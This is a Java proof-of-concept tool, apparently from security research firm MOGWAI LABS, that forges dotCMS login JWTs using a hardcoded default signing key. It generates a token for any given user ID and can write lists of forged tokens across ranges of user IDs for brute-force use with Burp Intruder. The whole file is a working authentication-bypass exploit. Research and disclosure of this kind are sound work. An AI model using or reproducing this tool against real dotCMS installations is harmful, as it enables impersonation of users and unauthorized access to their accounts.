package de.mogwailabs.research.dotCMSTokenGenerator;

import io.jsonwebtoken.JwtBuilder;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.security.Key;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import org.apache.commons.cli.*;

import de.mogwailabs.research.dotCMSTokenGenerator.Base64;
import de.mogwailabs.research.dotCMSTokenGenerator.JWTBean;


public class TokenGenerator {

	// Default Secret Key 
	private static Key signingKey = (Key) Base64.stringToObject(
			"rO0ABXNyABRqYXZhLnNlY3VyaXR5LktleVJlcL35T7OImqVDAgAETAAJYWxnb3JpdGhtdAASTGphdmEvbGFuZy9TdHJpbmc7WwAHZW5jb2RlZHQAAltCTAAGZm9ybWF0cQB+AAFMAAR0eXBldAAbTGphdmEvc2VjdXJpdHkvS2V5UmVwJFR5cGU7eHB0AANERVN1cgACW0Ks8xf4BghU4AIAAHhwAAAACBksSlj3ReywdAADUkFXfnIAGWphdmEuc2VjdXJpdHkuS2V5UmVwJFR5cGUAAAAAAAAAABIAAHhyAA5qYXZhLmxhbmcuRW51bQAAAAAAAAAAEgAAeHB0AAZTRUNSRVQ=");
	private static Key signingKeyOld = signingKey;
	
	public static void main(String[] args) {
		
		System.out.println("----- dotCMS TokenGenerator PoC by MOGWAI LABS GmbH (https://mogwailabs.de) -----");
		System.out.println();
		Options options = new Options();
		Option user = new Option("u", "user", true, "userID");
		user.setRequired(false);
		options.addOption(user);

		Option enumerate = new Option("e", "enumerate", true,
				"enumerate usernames (e.g. -e 1:100:dotcms.org.  --> dotcms.org.[1-100]");
		enumerate.setRequired(false);
		options.addOption(enumerate);

		Option output = new Option("o", "output", true, "output File for JWT List"); // For Burp intruder don't URL Encode Payload!
		output.setRequired(false);
		options.addOption(output);

		Option key = new Option("k", "key", true, "custom signing Key, the JWT will be signed with this key.");
		key.setRequired(false);
		options.addOption(key);

		CommandLineParser parser = new DefaultParser();
		HelpFormatter formatter = new HelpFormatter();
		CommandLine cmd;

		try {
			cmd = parser.parse(options, args);
		} catch (ParseException e) {
			System.out.println(e.getMessage());
			printHelpText(formatter, options);
			System.exit(1);
			return;
		}

		// Getting input parameters
		String userID = cmd.getOptionValue("user");
		String enumerateUserID = cmd.getOptionValue("enumerate");
		String outputPath = cmd.getOptionValue("output");
		String secretKey = cmd.getOptionValue("key");
		if (userID == null && (enumerateUserID == null || outputPath == null)) { // TODO better Syntax check
			printHelpText(formatter, options);
			System.exit(1);
		}

		// Setting custom secret key (otherwise it will use the default key)
		if (secretKey != null)
			signingKey = (Key) Base64.stringToObject(secretKey);
		String encryptedUserID = "";
		// If UserID given create token for UserID
		if (userID != null) {
			encryptedUserID = encryptUserID(userID);
			String jwt = generateToken(encryptedUserID);
			System.out.println(jwt);
		} else if (enumerateUserID != null && outputPath != null) {
			String[] separated = enumerateUserID.split(":");
			if (separated.length != 3) {
				System.out.println("Malformed -e parameter exiting...");
				System.exit(1);
			}
			int startIndex = 0;
			int endIndex = 0;
			try {
				startIndex = Integer.parseInt(separated[0]);
				endIndex = Integer.parseInt(separated[1]);
			} catch (NumberFormatException e) {
				System.out.println("Error parsing -e Parameter, example usage: '-e 1:100:username.'");
				System.out.println("Exiting");
				System.exit(1);
			}

			try {
				System.out.print("Starting to generate the JWT list...");
				PrintWriter pw = new PrintWriter(
						new FileOutputStream(new File(outputPath), false /* append = false */));
				for (int i = startIndex; i <= endIndex; i++) {
					userID = separated[2] + i;
					encryptedUserID = encryptUserID(userID);
					String jwt = generateToken(encryptedUserID);
					pw.append(jwt + "\n");

				}
				System.out.println("\nDone generating list to " + outputPath);
				pw.close();
			} catch (FileNotFoundException e) {
				e.printStackTrace();
			}
		}

	}

	public static String generateJWTToken(JWTBean jwtBean) {
		// This is the method to generate the JWT Token
		SignatureAlgorithm signatureAlgorithm = SignatureAlgorithm.HS256;

		long nowMillis = System.currentTimeMillis();
		java.util.Date now = new java.util.Date(nowMillis);
		JwtBuilder builder = Jwts.builder().setId(jwtBean.getId()).setIssuedAt(now).setSubject(jwtBean.getSubject())
				.setIssuer(jwtBean.getIssuer()).signWith(signatureAlgorithm, signingKey);

		if (jwtBean.getTtlMillis() >= 0L) {
			long expMillis = nowMillis + jwtBean.getTtlMillis();
			java.util.Date exp = new java.util.Date(expMillis);
			builder.setExpiration(exp);
		}

		return builder.compact();
	}

	public static String encryptUserID(String userID) {
		// This method encrypts the userID with the secret key
		String encryptedUserID = "";
		try {
			// Encrypt user ID with the secret key
			encryptedUserID = Encryptor.encrypt(signingKeyOld, userID); // Encrypting the userID with the installation default signing key because for some reason thats how it works. 
		} catch (Exception e) {
			e.printStackTrace();
		}
		return encryptedUserID;
	}

	public static String generateToken(String encryptedUserID) {
		// This method generates the "sub" field
		// for the JWT token and then calls the method to create the jwt token itself
		// Set Time
		long now = System.currentTimeMillis();
		long jwtMillis = 1200000; // Token TTL
		// Generate JWT "sub" Field
		String token = "{\"userId\":\"%s\\u003d\\u003d\",\"lastModified\":%d,\"companyId\":\"\"}";
		token = String.format(token, encryptedUserID.substring(0, encryptedUserID.length() - 2), now);
		// Generate the JWT
		JWTBean jwtBean = new JWTBean(encryptedUserID, token, encryptedUserID, jwtMillis);
		String jwt = generateJWTToken(jwtBean);
		return jwt;
	}

	public static void printHelpText(HelpFormatter formatter, Options options) {
		// This method prints the help text
		formatter.printHelp("generate_dotCMS_JWT.jar", "", options, "");
		System.out.println("\nExample usage: generateDotCMS_JWT.jar -u 'dotcms.org.1'");
		System.out.println("Example usage: generateDotCMS_JWT.jar -e '2700:2900:dotcms.org.' -o '/tmp/tokens.lst'");
	}

}
